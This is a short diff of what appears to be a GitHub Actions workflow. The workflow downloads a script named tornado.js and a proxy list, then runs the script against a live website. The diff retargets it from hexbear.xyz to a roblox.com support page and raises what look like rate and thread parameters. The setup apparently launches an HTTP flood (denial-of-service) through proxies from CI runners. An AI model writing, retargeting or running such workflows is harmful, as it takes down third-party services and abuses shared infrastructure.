@@ -17,7 +17,7 @@ jobs:
           wget https://github.com/kaneious/tornado/raw/refs/heads/main/tornado.js
           wget https://curl.by/jwa-X/proxies.txt
           npm i hpack
-          timeout 40 node tornado.js GET https://hexbear.xyz/not 40 8 64 proxies.txt --full --query 3
+          timeout 40 node tornado.js GET https://www.roblox.com/tr/support 50 9 90 proxies.txt --full --query 3
           
       - name: OK !
         run: |
